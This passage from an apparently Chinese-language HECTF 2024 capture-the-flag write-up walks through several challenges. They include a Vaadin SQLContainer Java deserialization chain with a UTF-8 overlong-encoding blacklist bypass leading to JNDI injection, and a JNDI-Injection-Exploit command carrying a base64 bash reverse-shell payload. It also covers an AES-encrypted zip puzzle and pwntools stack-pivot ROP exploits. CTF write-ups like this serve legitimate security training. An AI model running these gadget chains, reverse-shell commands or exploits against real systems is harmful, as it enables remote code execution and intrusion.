class="line">        <span class="keyword">for</span> (String str : denyClasses) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">denyClass</span> <span class="operator">=</span> str.toLowerCase();</span><br><span class="line">            <span class="keyword">if</span> (className.contains(denyClass)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, className);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		到这里常用的 spring、jackson 的链子都打不通了，只能看关于 vaadin 依赖的链子，网上公开的是 NestedMethodProperty 和 SQLContainer 这俩条链子，但是在 resolveClass 中 NestedMethodProperty 类在黑名单中无法使用</p>
<p>​		所以可以确定用 SQLContainer 链子，blacklist 黑名单的内容这里直接可以用 utf-8 编码来绕即可（网上的 SQLContainer 不太完整，需要手动本地调试一下），本题是出网的直接用 JDBCConnectionPool 类打 JNDI 注入即可</p>
<blockquote>
<p>JDBCConnectionPool#reserveConnection</p>
<p>​		getConnection</p>
<p>​				 TableQuery#  beginTransaction</p>
<p>​						TableQuery#containsRowWithkey</p>
<p>​								 containsId  （item 可控，item.getId 值 ==TableQuery）</p>
<p>​										 getValue   ----- 这一层，item  == sqlcontainer</p>
<p>​												toString</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.Utils.ReflectionUtil;</span><br><span class="line"><span class="keyword">import</span> com.example.Utils.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> com.utf.CustomObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.PropertysetItem;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.CacheMap;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.RowId;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.RowItem;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.SQLContainer;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.connection.J2EEConnectionPool;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.QueryDelegate;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.TableQuery;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.generator.DefaultSQLGenerator;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.ui.ListSelect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> String string=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">J2EEConnectionPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">J2EEConnectionPool</span>(<span class="string">&quot;ldap://&quot;</span>);</span><br><span class="line">        <span class="type">TableQuery</span> <span class="variable">tableQuery</span> <span class="operator">=</span> (TableQuery) </span><br><span class="line">ReflectionUtil.createWithoutConstructor(Class.forName(<span class="string">&quot;com.vaadin.data.util.sqlconta</span></span><br><span class="line"><span class="string"> iner.query.TableQuery&quot;</span>));</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;primaryKeyColumns&quot;</span>, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;fullTableName&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;sqlGenerator&quot;</span>, <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">DefaultSQLGenerator</span>());</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;connectionPool&quot;</span>, pool);</span><br><span class="line">        <span class="type">ListSelect</span> <span class="variable">listSelect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListSelect</span>();</span><br><span class="line">        <span class="type">SQLContainer</span> <span class="variable">sql</span> <span class="operator">=</span> (SQLContainer) </span><br><span class="line">ReflectionUtil.createObject(<span class="string">&quot;com.vaadin.data.util.sqlcontainer.SQLContainer&quot;</span>, <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        ReflectionUtil.setField(sql, <span class="string">&quot;queryDelegate&quot;</span>, tableQuery);</span><br><span class="line">        ReflectionUtil.setField(sql,<span class="string">&quot;cachedItems&quot;</span>,<span class="keyword">new</span> <span class="title class_">CacheMap</span>&lt;&gt;());</span><br><span class="line">        <span class="type">RowId</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RowId</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;value&quot;</span>, id);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;multiSelect&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;items&quot;</span>, sql);</span><br><span class="line">        <span class="type">PropertysetItem</span> <span class="variable">propertysetItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertysetItem</span>();</span><br><span class="line">        propertysetItem.addItemProperty(<span class="string">&quot;key&quot;</span>, listSelect);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">0</span>);</span><br><span class="line">        ReflectionUtil.setField(bad, <span class="string">&quot;val&quot;</span>, propertysetItem);</span><br><span class="line">        serialize2(bad);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize2</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CustomObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomObjectOutputStream</span>(<span class="keyword">new</span> </span><br><span class="line"><span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		CustomObjectOutputStream 类是网上公开的 utf-8 编码绕过（网上的有的没有对数字进行编码会导致报错， 可参考 P 神的文章 https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html  用 python 脚 本生成即可）</p>
<p>​		在 vps 上开启一个恶意的服务器：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,&#125;| &#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
<p>​		开启反弹 shell 监听的端口，最后在根目录获取 flag</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/d1555696b9964e9397405fd9cab4f124.png#pic_center" alt="在这里插入图片描述"></p>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Misc：</h2>
<h3 id="简单的压缩包"><a class="markdownIt-Anchor" href="#简单的压缩包">#</a> 简单的压缩包：</h3>
<p>​		打开之后有个 Re，打开发现是一个正则表达式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^([a-z])&#123;<span class="number">2</span>&#125;\d\d([^a-z])$</span><br></pre></td></tr></table></figure>
<p>​		前面两个是字符，第三四个是数字，第五个不是小写字母，根据这个生成个字典：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str_12 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">digit = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line">str_4 = <span class="string">&quot;&quot;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dict.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_12:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_12:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> digit:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> digit:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> str_4:</span><br><span class="line">                        dic =i+j+k+m</span><br><span class="line">                        f.write(dic+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>​		之后拿着这个去爆破，爆破到密码，不过这里非预期了，竟然可以用明文攻击，师傅们简直太强了，不过这里因为失去某些信息导致爆破难度增大也是我的锅：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np76_</span><br></pre></td></tr></table></figure>
<p>​		之后就是 png，winhex 发现藏了有文件，foremost 分离，分离后看到了个 py 文件和一个压缩包：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">key,iv</span>):</span><br><span class="line">    data = content</span><br><span class="line">    cipher1 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ct = cipher1.encrypt(pad(data, <span class="number">16</span>))</span><br><span class="line">    ct_hex = binascii.b2a_hex(ct)</span><br><span class="line">    <span class="keyword">return</span> ct_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;oringe.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">iv  = <span class="string">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class="line"></span><br><span class="line">en = encrypt(key,iv)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zip2.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(en)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		显然，压缩包被加密了，AES 加密和 key 都有，直接打：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ct_hex,key,iv</span>):</span><br><span class="line">    cipher2 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    hex_data = binascii.a2b_hex(ct_hex)</span><br><span class="line">    pt = unpad(cipher2.decrypt(hex_data), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">iv  = <span class="string">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密的zip文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jiami.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    endata = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建的解密zip文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jiemi.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dedata = decrypt(endata,key,iv)</span><br><span class="line">    f.write(dedata)</span><br></pre></td></tr></table></figure>
<p>​		9 解压后就有 flag 了。</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;c292af1-2b2ee35-6398bd4934f7626afc&#125;</span><br></pre></td></tr></table></figure>
<p>​</p>
<h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn</h2>
<h3 id="sign-in"><a class="markdownIt-Anchor" href="#sign-in">#</a> sign in</h3>
<p>​		检查无保护：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:/mnt/c/Users/20820/Downloads/attachment$ checksec pwn</span><br><span class="line">[*] &#x27;/mnt/c/Users/20820/Downloads/attachment/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+12h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please sign in!!!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;overflow&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your key&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, m, <span class="number">0xA</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;login--------&quot;</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    backd00r();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		两个办法：</p>
<p><strong>方法一：</strong></p>
<p>​		gets 没有能造成栈溢出，用 \x00 可以绕过 strlen 的比较，可以直接溢出劫持 rip 到 backd00r，这里就不给 exp 了。</p>
<p><strong>方法二：</strong></p>
<p>​		寻常绕 close (1)，key 为 HECTF!，之后 sh flag 报错带出来即可。</p>
<h3 id="find-eggy"><a class="markdownIt-Anchor" href="#find-eggy">#</a> find eggy：</h3>
<p>​		寻常栈迁移，漏洞在 check 函数里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check</span><span class="params">(__int16 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(aKaka);</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_4020A8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-------       --------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;||||||||       |||||||| \n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;                         \n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;           V              \n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t touch me!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;s, <span class="number">0x70</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TvT&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = atoi(buf);</span><br><span class="line">    v4 = calculate_sum_of_factors(v1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The sum of factors of %s is %d\n&quot;</span>, buf, v4);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;12345&quot;</span>) &amp;&amp; v4 == <span class="number">15616</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Congratulations! You found the flag&#123;this is flag&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		两次读取，第一次读到 bss 段上，第二次在栈上，但是第二次限制了读取大小，不足以构造 ROP 链，所以栈迁移到 bss 段上：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">9393</span>)</span><br><span class="line">s = <span class="number">0x405600</span></span><br><span class="line">system = <span class="number">0x4015ad</span></span><br><span class="line">binsh = <span class="number">0x403680</span></span><br><span class="line">rdi = <span class="number">0x401326</span></span><br><span class="line">leave = <span class="number">0x4014c0</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;-983040&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Don&#x27;t touch me!&quot;</span>)</span><br><span class="line">pay = p64(rdi) +p64(binsh) +p64(ret) +p64(system)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;TvT&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> +p64(s-<span class="number">8</span>)+p64(leave)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="arcaea_sorting"><a class="markdownIt-Anchor" href="#arcaea_sorting">#</a> Arcaea_Sorting：</h3>
<p>​		第一次出题，踩坑太多了，这次差点儿给自己弄废了，不过好歹是出出来了，坑啊，全是坑。</p>
<p>​		首先是 checksec 一下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/CTest/HECTF2024/pwn3$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/CTest/HECTF2024/pwn3/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>​		别问为啥是 32 位的，因为 32 位在 strspy 那里过不了，得用其他操作，不是我想考的点，所以这里就只有考 32 位了。</p>
<p>​		玩儿过 Arcaea 的应该都知道，这个程序大概有啥用，别的不说，先跑一下看看：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the Arcaea Query developed by g01den, which is currently in the development stage</span><br><span class="line">    ___</span><br><span class="line">   /   |  ______________ ____  ____ _</span><br><span class="line">  / /| | / ___/ ___/ __ `/ _ \/ __ `/</span><br><span class="line"> / ___ |/ /  / /__/ /_/ /  __/ /_/ /</span><br><span class="line">/_/  |_/_/   \___/\__,_/\___/\__,_/</span><br><span class="line">If you find any questions, please do not contact g01den for resolution</span><br><span class="line">I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?</span><br></pre></td></tr></table></figure>
<p>​		这里首先是让我们输入自己的定数，之后做啥处理没静态不清楚，随便输入一个 12 看看：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">Come on, the flowers are purple and about to turn red. You will step onto the ladder of the big shots</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br></pre></td></tr></table></figure>
<p>​		大概有啥用应该从字面上应该能懂：</p>
<ol>
<li>功能键 1 是算歌曲分数和单曲 ptt 然后加入 b30，具体逻辑是否正确我不是很清楚，但测试的时候没啥太大的问题。</li>
<li>功能键 2 是计算单曲 ptt 并输出</li>
<li>功能键 3 是从 b30 里计算出玩家 ptt，不计算 r10，所以只能做参考</li>
<li>功能键 5 是给最喜欢的谱子投票</li>
<li>功能键 5 是输出投的票的歌曲名字</li>
<li>功能键 5 是输出所有 b30 的内容</li>
<li>功能键 7 是推出这个系统</li>
</ol>
